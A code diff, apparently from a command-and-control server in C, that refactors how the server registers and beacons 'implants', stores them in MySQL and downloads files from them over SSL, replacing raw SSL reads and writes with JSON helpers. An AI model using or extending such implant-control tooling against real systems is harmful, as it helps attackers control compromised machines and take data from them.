@@ -96,12 +96,11 @@ void register_implant(MYSQL* con, cJSON *json, char *ip) {
 }
 
 char *beacon_implant(MYSQL* con, cJSON *json, char *ip) {
-
+	
     	cJSON *json_reply = cJSON_CreateObject();
 	char *implant_id = GenerateID(json);
     	if (check_implant_id(con, implant_id) == 0) {
 		/// id does not exist register to database
-
 		register_implant(con, json, ip);
     	    	cJSON_AddStringToObject(json_reply, "mode", "none");
     	    	char *reply = cJSON_Print(json_reply);
@@ -207,22 +206,24 @@ void *implant_handler(void *args) {
 	    return NULL;
 	}
 
-	char buffer[MAX_RESPONSE];
-	int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
-	if (bytes_received <= 0) {
-	    log_message(LOG_ERROR, "SSL_read failed");
-	    ERR_print_errors_fp(stderr);
-	    SSL_shutdown(ssl);
-	    SSL_free(ssl);
-	    close(client_fd);
-	    free(arg);
-	    return NULL;
-	}
-	buffer[bytes_received] = '\0';	
+	//char buffer[MAX_RESPONSE];
+	//int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
+	//if (bytes_received <= 0) {
+	//    log_message(LOG_ERROR, "SSL_read failed");
+	//    ERR_print_errors_fp(stderr);
+	//    SSL_shutdown(ssl);
+	//    SSL_free(ssl);
+	//    close(client_fd);
+	//    free(arg);
+	//    return NULL;
+	//}
+	//buffer[bytes_received] = '\0';	
+	char *buffer = recv_json(ssl);
 	cJSON *json = cJSON_Parse(buffer);
+	free(buffer);
 	if (!json) {
 	    //fprintf(stderr, "[!] Error parsing JSON\n");
-	    log_message(LOG_WARN, "Error parsing JSON (TCP [SSL] Handler)");
+	    log_message(LOG_WARN, "Error parsing JSON (IMPLANT Handler)");
 	    SSL_shutdown(ssl);
 	    SSL_free(ssl);
 	    close(client_fd);
@@ -231,7 +232,8 @@ void *implant_handler(void *args) {
 	}	
 
 	char *reply = beacon_implant(con, json, arg->ip);
-	SSL_write(ssl, reply, strlen(reply));
+	//SSL_write(ssl, reply, strlen(reply));
+	send_json(ssl, reply);
 	cJSON *check_mode = cJSON_Parse(reply);
 	free(reply);
 	if (!check_mode) {
@@ -249,13 +251,14 @@ void *implant_handler(void *args) {
 	    download_from_implant(ssl);
 	}
 
-	memset(buffer, 0, sizeof(buffer));
-	bytes_received = SSL_read(ssl, buffer, sizeof(buffer)-1);
-	if (bytes_received <= 0) {
-	    log_message(LOG_ERROR, "Failed to receive data [SSL Beacon]");
-	    goto CLEANUP;
-	}
-	buffer[bytes_received] = '\0'; 
+	//memset(buffer, 0, sizeof(buffer));
+	//bytes_received = SSL_read(ssl, buffer, sizeof(buffer)-1);
+	buffer = recv_json(ssl);
+	//if (bytes_received <= 0) {
+	//    log_message(LOG_ERROR, "Failed to receive data [SSL Beacon]");
+	//    goto CLEANUP;
+	//}
+	//buffer[bytes_received] = '\0'; 
 	cJSON *response = cJSON_Parse(buffer);
 	if (!response) {
 	    log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
